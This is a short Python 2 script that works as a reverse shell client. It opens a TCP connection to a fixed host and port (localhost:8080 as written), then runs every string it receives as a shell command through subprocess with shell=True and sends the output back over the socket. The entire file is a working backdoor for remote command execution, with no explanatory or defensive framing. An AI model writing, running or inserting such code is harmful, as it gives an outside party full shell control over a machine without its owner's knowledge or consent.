import socket,subprocess

host = "127.0.0.1"
port = 8080
buff = 2048	
client_socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
client_socket.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR, 1)

client_socket.connect((host,port))

while True:
	received_data = client_socket.recv(buff)
	if received_data == 'quit' :
		client_socket.close()
	else :
		command = subprocess.Popen([received_data],stdout=subprocess.PIPE,shell=True).communicate()[0]
		print command
		client_socket.send(str(command))
		
